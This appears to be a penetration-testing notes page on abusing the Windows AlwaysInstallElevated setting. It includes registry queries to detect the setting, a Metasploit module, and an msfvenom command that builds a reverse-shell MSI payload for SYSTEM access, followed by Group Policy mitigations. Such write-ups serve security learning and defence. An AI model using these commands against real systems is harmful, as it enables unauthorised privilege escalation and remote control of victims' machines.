# Always Install Elevated

Always Install Elevated is a registry / GPO setting that allows non privileged accounts to install Windows Package Installer (MSI) files with SYSTEM permissions. Usually this is used in environments to reduce workload for Helpdesk staff for when users require software to be installed.

Command to query registry keys:

```bash
# Value 0x1 represents AlwaysInstallElevated as being enabled.

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

![](<../../../../.gitbook/assets/image (1743).png>)

WinPEAS can also be used to show this setting as being enabled.

![](<../../../../.gitbook/assets/image (1742).png>)

## Exploitation

### Metasploit

Metasploit can be used to abuse this privilege.

```bash
use exploit/windows/local/always_install_elevated
```

![](<../../../../.gitbook/assets/image (1740) (1).png>)

### Manual - msfvenom

msfvenom can be used to create a reverse shell disguised as a MSI file. When the file is executed / installed a reverse shell as SYSTEM will be executed.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f msi -o Application.msi
```

Manual install of the MSI file:

![Manual MSI Install](<../../../../.gitbook/assets/MSI PrivEsc.png>)

Which returns a SYSTEM shell as shown below.

![](<../../../../.gitbook/assets/image (1741).png>)

## Mitigations

Ensure that the following Group Policy Objects are set to disabled:

* Computer Configuration\Administrative Templates\Windows Components\Windows Installer
* User Configuration\Administrative Templates\Windows Components\Windows Installer

![](<../../../../.gitbook/assets/MSI GPO.png>)
